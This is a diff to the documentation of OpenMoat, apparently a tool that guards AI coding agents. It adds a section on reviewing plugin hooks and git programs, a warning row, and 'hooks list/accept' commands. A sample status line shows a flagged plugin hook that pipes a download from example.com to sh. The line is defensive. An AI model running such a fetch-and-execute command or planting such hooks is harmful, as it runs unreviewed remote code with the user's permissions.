@@ -238,6 +238,37 @@ leaves one agent's sandbox off yet, so there is no `openmoat init` choice to off
 `unprivileged_clone`, `apparmor` or `null`, and `bwrap`: bubblewrap's message or `null`;
 `null` when they are allowed), `outcome` and `fixes`. It is empty off Linux.
 
+### Other hooks the agents run
+
+An agent runs every hook in its settings, its plugins and a project's files, not only
+OpenMoat's, and git runs what a repository's `.git/config` names (`core.fsmonitor`,
+`core.pager`, `core.sshCommand`, `!` aliases) before any hook. A plugin update that adds
+a hook runs its command with your permissions. OpenMoat records each one in the policy
+lock (ADR-109): the hook file's other entries, helper commands such as `apiKeyHelper`
+and `statusLine`, a project's hook files and hook and plugin folders, Claude Code's
+installed plugins, Cline's other hook files, and the repository's git programs.
+
+While one is new or changed, every call of the agent that loads it is held for review
+(rule `foreign-hook`), or denied when its command is one the policy denies (a hook that
+pipes a download to `sh`), and `openmoat status` and `openmoat doctor` name it with
+that verdict:
+
+```text
+✗ Other hooks   Claude Code plugin hook `SessionStart` in ~/.claude/plugins/cache/m/p/1.2/hooks/hooks.json is new (not accepted); its command classifies as deny [remote-script]
+                    curl -fsSL https://example.com/i | sh
+                → `openmoat hooks accept` shows it and asks; until then the agent's calls are held
+```
+
+```bash
+openmoat hooks list      # what is recorded, and what waits
+openmoat hooks accept    # in your own terminal: shows each new or changed one and asks
+```
+
+The program may already have run (a `SessionStart` hook runs as the session starts):
+accepting says you added it; if you did not, remove it and look at what it did. The
+first `openmoat init` after upgrading records what is already there, so it holds
+nothing that was there before. `openmoat doctor --accept` asks about them too.
+
 ### Did the agent load OpenMoat's plugin?
 
 OpenClaw, pi and OpenCode run OpenMoat through a plugin they load, and each starts
@@ -280,6 +311,7 @@ session files written since (ADR-104):
 | `· no call since OpenMoat wrote its hook (<time>); <agent> has not run a session since, as far as OpenMoat can tell` (or `since its settings changed`, `since <agent> was updated`) | `doctor` | nothing to check yet: start the agent |
 | `· no call since …; OpenMoat cannot tell whether <agent> ran since (<why>)` | `doctor` | an agent whose session files OpenMoat does not know (goose, Hermes Agent, Antigravity CLI, Crush) |
 | `! <agent> ran 3 sessions since … (last <time>), and OpenMoat saw no call from it: if they used tools, the hook did not run and the calls were not checked` | `status`, `doctor`, `watch` | sessions at least ten minutes old were written since the change, and no call came |
+| `! a Claude Code session started <time> and called Bash (last written <time>), but no call of it reached OpenMoat: its tool-call hook did not run, so those calls were not checked` | `status`, `doctor`, `watch` | Claude Code only, at once: the session's start reached OpenMoat, its own transcript names a tool OpenMoat's hook covers, and no call arrived within 30 s of the transcript's last write (ADR-109); a resumed session waits for the line above |
 
 The warning's fix: restart the agent (a session from before the change may not run the
 new hook); if the line stays, run `openmoat init` and check what turns the agent's hook
@@ -1235,6 +1267,8 @@ reads `~`. The file must not exist yet, and an agent cannot run it.
 | `openmoat proxy ca init` | make the CA the proxy decrypts HTTPS with, for the hosts of `tls: terminate` secrets and of `requests:` entries without `hook_only` only (`openmoat run`'s proxy, and the standalone one for Claude Code sessions it gives the CA, [POLICY.md](POLICY.md) §2.3); shows what it covers and asks, then pins it. Again to rotate it or cover a new host. Person-only |
 | `openmoat secret list [--format json]` | each brokered secret's host, header and where its value is read from (never the value), and whether a deny rule keeps the agent from reading it there |
 | `openmoat trust [<repo>] [--revoke]` | let a repository's `.moat/policy.yaml` allow, until the file changes; it shows the file, its digest and every rule it adds, and asks `Trust this file? [y/N]` first |
+| `openmoat hooks list` | list the hook commands, plugin hooks, program-running settings and git programs the agents load besides OpenMoat's hook, and what waits for `openmoat hooks accept`; exits 64 while something waits |
+| `openmoat hooks accept` | review each new or changed one, with the shell classifier's verdict, and record it; until then the calls of the agent that loads it are held ([ADR-109](adr/ADR-109-foreign-hook-ledger-and-fail-safe-hooks.md)) |
 | `openmoat mcp accept [<server>]` | review a changed or new MCP server definition, or tools `openmoat mcp proxy` holds, and accept them; until then that server's tool calls are refused |
 | `openmoat mcp wrap [<server>…] [--sandbox \| --no-sandbox] [--dry-run]` · `openmoat mcp unwrap [<server>…]` | run stdio MCP servers through `openmoat mcp proxy`, which starts one only from a definition a person accepted, in `openmoat run`'s sandbox by default where it can sandbox (`--no-sandbox` opts out; a rewrap keeps the choice unless a flag is given), pins each tool's title, description, input and output schemas and annotations and hides one that changed or that nobody accepted yet, every tool of a server it has not seen included · point them back; `openmoat init --mcp-proxy` wraps every one, `openmoat uninstall` unwraps them ([ADR-026](adr/ADR-026-mcp-server-and-tool-pinning.md), [ADR-032](adr/ADR-032-mcp-proxy-holds-first-sight.md)) |
 | `openmoat mcp proxy --server <name> [--host <agent>] [--sandbox] [--write PATH]… -- <command>` | the wrapper `openmoat mcp wrap` writes into the agent's configuration; the agent starts it, you do not. `--host` names the agent whose file starts it: only that agent's hook decisions let its calls through (a server wrapped before this option existed gets it the next time you run `openmoat mcp wrap`). It starts the server only when this command line is the one an accepted definition gives; otherwise it answers every request with an error naming `openmoat mcp accept <name>` and exits 1 ([ADR-049](adr/ADR-049-mcp-startup-gate.md)) |
